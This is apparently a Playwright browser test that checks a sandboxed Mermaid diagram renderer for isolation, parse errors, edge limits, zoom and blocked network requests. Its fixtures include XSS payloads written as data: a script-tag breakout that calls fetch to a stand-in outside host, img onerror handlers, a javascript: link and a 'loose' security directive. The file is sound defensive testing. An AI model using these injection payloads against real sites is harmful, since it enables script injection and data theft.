import assert from 'node:assert/strict';
import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { buildDiagramDocument, MAX_DIAGRAM_EDGES } from '../../src/artifacts/diagram.ts';

// A real browser gate, separate from the fast pure artifact verifier. Supply a
// local Playwright installation and browser; no downloads occur in this script.
const { chromium } = await import(process.env.PERCH_PLAYWRIGHT_MODULE || 'playwright');
const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const runtime = JSON.parse(readFileSync(path.join(root, 'src/artifacts/generated/mermaid-runtime.json'), 'utf8'));
const directory = path.resolve(process.env.PERCH_DIAGRAM_REPORT_DIR || path.join(root, 'verification-output/diagrams'));
mkdirSync(directory, { recursive: true });
const browser = await chromium.launch({
  executablePath: process.env.PERCH_CHROMIUM_PATH || undefined,
  args: ['--no-sandbox', '--disable-gpu', '--disable-dev-shm-usage'],
});
const context = await browser.newContext({ viewport: { width: 412, height: 740 } });
const requests = [];
await context.route('**/*', route => { requests.push(route.request().url()); return route.abort(); });
const results = [];
const theme = { scheme: 'dark', background: '#1b1e23', surface: '#22262d', ink: '#e8e8e6', muted: '#a3a8b0', primary: '#8ab4e8', primarySoft: '#293951', line: '#414752' };
const fixtures = [
  ['flowchart', 'flowchart TD\n  Phone[Perch] --> Gateway[Workspace connection]\n  Gateway --> Tern[Tern panes]\n  Gateway --> OMP[OMP sessions]\n  Tern --> Agent[Existing agent]\n  OMP --> Agent', 'ready'],
  ['sequence', 'sequenceDiagram\n  participant P as Perch\n  participant T as Tern\n  participant O as OMP\n  P->>T: Read pending request\n  activate T\n  T-->>P: Plan and choices\n  deactivate T\n  P->>T: Approve choice\n  T->>O: Owner event', 'ready'],
  ['class', 'classDiagram\n  class Workspace {\n    +connect()\n  }\n  class Session {\n    +String id\n  }\n  Workspace --> Session', 'ready'],
  ['er', 'erDiagram\n  WORKSPACE ||--o{ SESSION : owns\n  SESSION ||--o{ ARTIFACT : produces', 'ready'],
  ['state', 'stateDiagram-v2\n  [*] --> Idle\n  Idle --> Running: Prompt\n  Running --> Approval: Tool\n  Approval --> Running: Allow\n  Running --> Idle: Complete', 'ready'],
  ['journey', 'journey\n  title Review an artifact\n  section Read\n    Open report: 5: User\n    Inspect diagram: 5: User\n  section Decide\n    Approve plan: 4: User', 'ready'],
  ['malformed', 'flowchart TD\n  A[Unclosed node --> B', 'error'],
  ['unknown-grammar', 'perchDiagram\n  A --> B', 'error'],
  ['script-boundary', 'flowchart TD\n A["</script><script>parent.parent.fixtureCompromised=true;fetch(\'https://outside.invalid/stolen\')</script>"] --> B[Safe]', 'ready'],
  ['hostile-html', 'flowchart TD\n A["<img src=\'https://outside.invalid/image\' onerror=\'parent.parent.fixtureCompromised=true\'>"] --> B[Safe]', 'ready'],
  ['javascript-link', 'flowchart TD\n A[Click] --> B[Safe]\n click A "javascript:parent.parent.fixtureCompromised=true"', 'ready'],
  ['loose-directive', '%%{init:{"securityLevel":"loose","htmlLabels":true,"maxEdges":99999}}%%\nflowchart TD\n A["<img src=\'https://outside.invalid/directive\' onerror=\'parent.parent.fixtureCompromised=true\'>"] --> B[Safe]', 'ready'],
  ['edge-limit', 'flowchart TD\n' + Array.from({length:MAX_DIAGRAM_EDGES + 1}, (_, i) => `N${i} --> N${i + 1}`).join('\n'), 'error'],
];
try {
  for (const [name, source, expected] of fixtures) {
    const page = await context.newPage();
    const pageErrors = [];
    page.on('pageerror', error => pageErrors.push(error.message));
    const document = buildDiagramDocument(source, theme, 'BrowserFixtureNonce1234567890', runtime.script);
    const started = performance.now();
    // Reproduce the web renderer's extra opaque outer iframe, not an unsandboxed
    // injection of SVG into the test page. The native frame uses the inner two.
    await page.setContent('<!doctype html><html><body style="margin:0"><iframe title="Artifact" sandbox="allow-scripts" style="width:100vw;height:100vh;border:0"></iframe></body></html>');
    await page.evaluate(document => {
      window.fixtureCompromised = false;
      document && (window.document.querySelector('iframe').srcdoc = document);
    }, document);
    const frame = page.frameLocator('iframe').frameLocator('iframe');
    await frame.locator('#status[data-state="' + expected + '"]').waitFor({state:'attached', timeout:15000});
    const status = await frame.locator('#status').textContent();
    const svgCount = await frame.locator('#output > svg').count();
    assert.equal(svgCount, expected === 'ready' ? 1 : 0, name);
    assert.equal(await page.evaluate(() => window.fixtureCompromised), false, name + ' executed untrusted source');
    assert.equal(await frame.locator('#output script, #output a[href], #output iframe, #output object').count(), 0, name + ' exposed an active resource');
    const actualFrame = page.frames().find(candidate => candidate.parentFrame()?.parentFrame());
    assert(actualFrame, 'inner frame missing');
    const isolation = await actualFrame.evaluate(() => {
      let parentDenied = false;
      try { void parent.document.body; } catch { parentDenied = true; }
      return { parentDenied, bridge: typeof window.ReactNativeWebView,
        config: window.mermaid?.mermaidAPI.getConfig().securityLevel };
    });
    assert.deepEqual(isolation, {parentDenied:true, bridge:'undefined', config:'strict'}, name + ' lost isolation');
    if (expected === 'ready' && name === 'flowchart') {
      const before = await frame.locator('#zoom').textContent();
      await frame.getByRole('button', {name:'Zoom in', exact:true}).click();
      assert.notEqual(await frame.locator('#zoom').textContent(), before);
      await frame.getByRole('button', {name:'Fit', exact:true}).click();
      await page.screenshot({path:path.join(directory, 'mermaid-dark-phone.png')});
    }
    results.push({name, expected, state:expected, durationMs:Math.round(performance.now() - started), svgCount,
      status:expected === 'error' ? status : undefined, pageErrors});
    console.log('PASS ' + name);
    await page.close();
  }
  assert.deepEqual(requests, [], 'An isolated diagram attempted a network request');
  writeFileSync(path.join(directory, 'report.json'), JSON.stringify({
    browser:browser.version(), mermaid:runtime.version, bundleSha256:runtime.sha256,
    fixtureCount:results.length, requests, results,
    qualification:'Desktop Chromium with phone-sized viewport; not Android WebView, physical-device performance, or a security audit.',
  }, null, 2) + '\n');
  console.log('PASS real iframe rendering, parse errors, complexity limit, hostile labels/directives, isolation, zoom and offline operation.');
} finally {
  await browser.close();
}
